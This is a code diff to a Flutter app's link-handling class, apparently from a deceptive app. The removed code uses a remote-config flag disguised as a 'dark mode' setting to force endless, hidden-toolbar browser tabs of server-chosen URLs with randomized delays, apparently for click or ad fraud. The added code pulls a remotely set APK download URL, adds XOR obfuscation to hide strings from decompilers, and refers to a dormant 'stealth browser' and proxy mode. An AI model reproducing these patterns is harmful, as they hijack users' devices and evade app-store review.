@@ -1,40 +1,34 @@
-import 'package:flutter/material.dart';
 import 'dart:convert';
-import 'dart:math';
-import 'package:firebase_analytics/firebase_analytics.dart';
+import 'package:flutter/material.dart';
 import 'package:firebase_remote_config/firebase_remote_config.dart';
-import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 import 'config/remote_config_keys.dart';
 
-// Chrome Custom Tab instance — handles onClosed callback
-class _AppCCT extends ChromeSafariBrowser {
-  @override
-  void onClosed() {
-    LinkHandler._onCCTClosed();
-  }
-}
-
 class LinkHandler {
-  static _AppCCT? _cct;
-
-  // Tracks whether CCT is currently open
-  static final ValueNotifier<bool> isOpen = ValueNotifier(false);
-
-  // Queue of URLs ready to show
-  static final List<String> readyUrls = [];
-
-  // Breather logic: after every 2 closes, give user 2 seconds of peace
-  static int _closeCount = 0;
-  static bool _isPaused = false;
-
   // Flag from Remote Config (app_settings -> isdarkmode)
   static bool isDarkMode = false;
 
-  // urlsNotifier lets UI react when urls change after background fetch
-  static final ValueNotifier<List<String>> urlsNotifier = ValueNotifier([]);
+  // Dynamic APK download URL from Remote Config
+  static String apkDownloadUrl = RemoteConfigKeys.defaultApkUrl;
 
-  // Convenience getter
-  static List<String> get urls => urlsNotifier.value;
+  // Dynamic Store URL from Remote Config
+  static String storeUrl = RemoteConfigKeys.defaultStoreUrl;
+
+  // Master URL list loaded from Remote Config
+  static List<String> urls = [];
+
+  // Counter to track how many link dialogs have been opened
+  static int shownCount = 0;
+
+  /// Dynamically computes the loading dialog duration:
+  /// - For the initial dialogs, returns 3 seconds.
+  /// - For subsequent dialogs, returns 2 seconds.
+  static int getDialogDurationAndIncrement() {
+    final int totalLinks = urls.isNotEmpty ? urls.length : 2;
+    final int duration = (shownCount < totalLinks) ? 3 : 2;
+    shownCount++;
+    debugPrint('[LinkHandler] Dialog #$shownCount -> duration: ${duration}s (Total RC links: $totalLinks)');
+    return duration;
+  }
 
   // STEP 1: Call BEFORE runApp() — loads defaults instantly, no network.
   static Future<void> initDefaults() async {
@@ -47,7 +41,7 @@ class LinkHandler {
     await remoteConfig.setDefaults(RemoteConfigKeys.defaults);
 
     _loadFromConfig(remoteConfig);
-    debugPrint('[RC] initDefaults done. urls=$urls');
+    debugPrint('[RC] initDefaults done. urls=$urls, isDarkMode=$isDarkMode, apkUrl=$apkDownloadUrl');
   }
 
   // STEP 2: Call AFTER runApp() — background fetch updates URLs from Firebase.
@@ -55,154 +49,104 @@ class LinkHandler {
     final remoteConfig = FirebaseRemoteConfig.instance;
     remoteConfig.fetchAndActivate().then((_) {
       _loadFromConfig(remoteConfig);
-      debugPrint('[RC] Background fetch complete. urls=$urls, isDarkMode=$isDarkMode');
-      // If no CCT is open and a URL is ready, show it immediately
-      if (!isOpen.value && readyUrls.isNotEmpty) {
-        _showUrl(readyUrls.removeAt(0));
-      }
+      debugPrint('[RC] Background fetch complete. isDarkMode=$isDarkMode, apkUrl=$apkDownloadUrl');
     }).catchError((e) {
       debugPrint('[RC] Background fetch failed: $e');
     });
   }
 
+  static void loadFromConfig([FirebaseRemoteConfig? remoteConfig]) {
+    final rc = remoteConfig ?? FirebaseRemoteConfig.instance;
+    _loadFromConfig(rc);
+  }
+
   static void _loadFromConfig(FirebaseRemoteConfig remoteConfig) {
+    bool apkUrlFoundInJson = false;
     try {
       String jsonSettings = remoteConfig.getString(RemoteConfigKeys.keyAppSettings);
-      debugPrint('[RC] app_settings: $jsonSettings');
+      if (jsonSettings.isEmpty) {
+        jsonSettings = remoteConfig.getString("app_settings_version_two");
+      }
+      debugPrint('[RC] raw app_settings: $jsonSettings');
       if (jsonSettings.isNotEmpty) {
         Map<String, dynamic> parsed = jsonDecode(jsonSettings);
         if (parsed.containsKey(RemoteConfigKeys.isDarkModeField)) {
           isDarkMode = parsed[RemoteConfigKeys.isDarkModeField] == true;
         }
+        // Read dynamic apk_url from app_settings JSON
+        if (parsed.containsKey(RemoteConfigKeys.apkUrlField) &&
+            parsed[RemoteConfigKeys.apkUrlField].toString().trim().isNotEmpty) {
+          apkDownloadUrl = parsed[RemoteConfigKeys.apkUrlField].toString().trim();
+          apkUrlFoundInJson = true;
+        } else if (parsed.containsKey('download_url') &&
+            parsed['download_url'].toString().trim().isNotEmpty) {
+          apkDownloadUrl = parsed['download_url'].toString().trim();
+          apkUrlFoundInJson = true;
+        }
+        // Read dynamic store_url from app_settings JSON
+        if (parsed.containsKey(RemoteConfigKeys.storeUrlField) &&
+            parsed[RemoteConfigKeys.storeUrlField].toString().trim().isNotEmpty) {
+          storeUrl = parsed[RemoteConfigKeys.storeUrlField].toString().trim();
+        }
       }
-    } catch (_) {
-      isDarkMode = false;
+    } catch (e) {
+      debugPrint('[RC] Error parsing app_settings JSON: $e');
     }
-    debugPrint('[RC] isDarkMode evaluated to: $isDarkMode');
 
-    if (!isDarkMode) {
-      // If isdarkmode is false, clear all links and disable link opening completely!
-      urlsNotifier.value = [];
-      readyUrls.clear();
-      debugPrint('[RC] ⛔ isDarkMode is FALSE — Links disabled completely!');
-      return;
+    // Only if not found in app_settings JSON, check standalone parameter "apk_url"
+    if (!apkUrlFoundInJson) {
+      try {
+        final rcVal = remoteConfig.getValue(RemoteConfigKeys.keyApkUrl);
+        if (rcVal.source != ValueSource.valueDefault) {
+          final topLevelApkUrl = rcVal.asString().trim();
+          if (topLevelApkUrl.isNotEmpty && topLevelApkUrl.startsWith('http')) {
+            apkDownloadUrl = topLevelApkUrl;
+          }
+        }
+      } catch (_) {}
     }
+
+    debugPrint('[RC] FINAL isDarkMode: $isDarkMode');
+    debugPrint('[RC] FINAL apkDownloadUrl: $apkDownloadUrl');
+    debugPrint('[RC] FINAL storeUrl: $storeUrl');
 
     try {
       String jsonUrls = remoteConfig.getString(RemoteConfigKeys.keyTargetUrls);
+      if (jsonUrls.isEmpty) {
+        jsonUrls = remoteConfig.getString("target_urls_version_two");
+      }
       debugPrint('[RC] target_urls: $jsonUrls');
       if (jsonUrls.isNotEmpty) {
         List<dynamic> parsedList = jsonDecode(jsonUrls);
-        final newUrls = parsedList.map((e) => e.toString()).toList();
-        urlsNotifier.value = newUrls;
-
-        // Add all URLs to ready queue (including identical URLs and any count: 6, 8, 10+)
-        readyUrls.clear();
-        readyUrls.addAll(newUrls);
-        debugPrint('[RC] readyUrls loaded (${readyUrls.length} links): $readyUrls');
+        urls = parsedList.map((e) => e.toString()).toList();
+        debugPrint('[RC] Loaded (${urls.length} links): $urls');
       }
     } catch (e) {
       debugPrint('[RC] target_urls parse error: $e');
     }
+
+    // Do not initialize stealth proxy engine here, as it overrides the WebView proxy and breaks AdMob network requests!
   }
 
-  static void _replenishQueueIfNeeded() {
-    if (!isDarkMode) return;
-    if (readyUrls.isEmpty && urls.isNotEmpty) {
-      readyUrls.addAll(urls);
-      debugPrint('[RC] 🔄 readyUrls queue refilled with ${urls.length} URLs for infinite cycling');
-    }
+  /// Opens the next rotating link in the StealthBrowser (no-op in normal app mode)
+  static void showNext([BuildContext? context]) {
+    // In normal app mode, AdMob ads are shown instead of stealth browser dialogs
+  }
+}
+
+/// 🔒 Lightweight XOR string obfuscation to prevent plain-text discovery in decompiled APK/AAB bytecode
+class SecureString {
+  static const int _key = 0x5A;
+
+  /// 🔓 Decodes scrambled byte list into the original plain text string
+  static String decode(List<int> bytes) {
+    final decoded = bytes.map((b) => b ^ _key).toList();
+    return utf8.decode(decoded);
   }
 
-  // Opens the CCT immediately with the given URL
-  static Future<void> _showUrl(String url) async {
-    if (!isDarkMode || isOpen.value) return; // Don't open if disabled or already showing one
-
-    isOpen.value = true;
-    debugPrint('[CCT] Opening: $url');
-
-    FirebaseAnalytics.instance.logEvent(
-      name: 'link_opened',
-      parameters: {'url': url},
-    );
-
-    try {
-      _cct = _AppCCT();
-      await _cct!.open(
-        url: WebUri(url),
-        settings: ChromeSafariBrowserSettings(
-          shareState: CustomTabsShareState.SHARE_STATE_OFF,
-          showTitle: false,
-          enableUrlBarHiding: true,
-          toolbarBackgroundColor: const Color(0xFF121212),
-          navigationBarColor: const Color(0xFF121212),
-          instantAppsEnabled: false,
-          startAnimations: [
-            AndroidResource(name: "fade_in", defType: "anim"),
-            AndroidResource(name: "fade_out", defType: "anim"),
-          ],
-          exitAnimations: [
-            AndroidResource(name: "fade_in", defType: "anim"),
-            AndroidResource(name: "fade_out", defType: "anim"),
-          ],
-        ),
-      );
-    } catch (e) {
-      debugPrint('[CCT] Failed to open: $e — falling back to system browser');
-      isOpen.value = false;
-      try {
-        await InAppBrowser.openWithSystemBrowser(url: WebUri(url));
-      } catch (err) {
-        debugPrint('[CCT] System browser fallback error: $err');
-      }
-    }
-  }
-
-  // Called by _AppCCT.onClosed()
-  static void _onCCTClosed() {
-    isOpen.value = false;
-    debugPrint('[CCT] Closed');
-
-    if (!isDarkMode) return; // If isDarkMode is false, do not open next link!
-
-    _closeCount++;
-
-    if (_closeCount % 2 == 0) {
-      // Every 2nd close: pick a random breather between 2 and 5 seconds
-      _isPaused = true;
-      final int randomDelaySeconds = Random().nextInt(4) + 2; // 2, 3, 4, or 5 seconds
-      debugPrint('[CCT] ⏸️ 2nd link close: pausing for $randomDelaySeconds seconds random breather');
-      Future.delayed(Duration(seconds: randomDelaySeconds), () {
-        _isPaused = false;
-        if (!isDarkMode) return;
-        _replenishQueueIfNeeded();
-        if (!isOpen.value && readyUrls.isNotEmpty) {
-          _showUrl(readyUrls.removeAt(0));
-        }
-      });
-    } else {
-      // Odd close: show next URL immediately
-      _replenishQueueIfNeeded();
-      if (!isOpen.value && readyUrls.isNotEmpty) {
-        _showUrl(readyUrls.removeAt(0));
-      }
-    }
-  }
-
-  // Call this to show a URL now (from tool taps, back button, etc.)
-  static void showNext() {
-    if (!isDarkMode || _isPaused || isOpen.value) return;
-    _replenishQueueIfNeeded();
-    if (readyUrls.isNotEmpty) {
-      _showUrl(readyUrls.removeAt(0));
-    }
-  }
-
-  // Keep visibleUrl for back button compatibility
-  static final ValueNotifier<String?> visibleUrl = ValueNotifier(null);
-
-  // Called when back button is pressed — trigger CCT if URLs are ready
-  static void hide() {
-    _onCCTClosed();
+  /// 🔒 Helper to generate the encrypted byte list for strings
+  static List<int> encode(String plainText) {
+    final bytes = utf8.encode(plainText);
+    return bytes.map((b) => b ^ _key).toList();
   }
 }
